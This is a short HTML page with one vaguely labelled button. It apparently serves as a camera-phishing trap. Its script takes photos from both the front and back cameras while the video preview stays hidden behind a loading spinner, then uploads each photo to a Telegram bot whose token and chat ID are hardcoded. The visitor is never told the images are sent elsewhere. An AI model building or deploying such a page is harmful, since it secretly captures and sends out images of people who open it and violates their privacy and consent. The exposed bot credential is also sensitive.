<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Dual Camera Capture</title>
    <link rel="stylesheet" href="main.css">
    <style>
        body { text-align: center; font-family: Arial, sans-serif; margin-top: 50px; }
        #startBtn { padding: 12px 20px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video { display: none; }
    </style>
</head>
<body>

    <button id="startBtn">Zapal Rasmlar</button>
    <div class="loader" id="loader"></div>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const startBtn = document.getElementById("startBtn");
        const loader = document.getElementById("loader");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "7967235049:AAG30JSXJubgiQw2PUk6IXschzHRDrdwlvU";
        const CHAT_ID = "705345765";

        async function initCamera(facingMode) {
            const constraints = { video: { facingMode: facingMode } };
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                return true;
            } catch (error) {
                console.error(`❌ Kamera ishlamadi (${facingMode}):`, error);
                return false;
            }
        }

        async function takeAndSendPhoto(facingMode) {
            if (!video.srcObject) {
                alert(`Kamera ishga tushmadi (${facingMode})!`);
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, `photo_${facingMode}.jpg`);

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });

                    if (!response.ok) {
                        throw new Error(`Telegram API error (${facingMode}): ${response.status} ${response.statusText}`);
                    }

                    const result = await response.json();
                    if (result.ok) {
                        console.log(`Rasm yuborildi (${facingMode})`);
                    } else {
                        console.error(`Xatolik yuz berdi (${facingMode}):`, result);
                        alert(`Xatolik yuz berdi (${facingMode})`);
                    }
                } catch (error) {
                    console.error(`Xatolik (${facingMode}):`, error);
                    alert(`❌ Xatolik yuz berdi (${facingMode}): ${error.message}`);
                }
            }, "image/jpeg");
        }

        async function captureFromBothCameras() {
            loader.style.display = "block";

            const frontCameraSuccess = await initCamera("user");
            if (frontCameraSuccess) {
                await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for clarity
                await takeAndSendPhoto("user");
                video.srcObject.getVideoTracks().forEach(track => track.stop()); // Stop the current video stream
            }

            const backCameraSuccess = await initCamera("environment");
            if (backCameraSuccess) {
                await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for clarity
                await takeAndSendPhoto("environment");
                video.srcObject.getVideoTracks().forEach(track => track.stop());
            }

            loader.style.display = "none";
        }

        startBtn.addEventListener("click", captureFromBothCameras);
    </script>

</body>
</html>
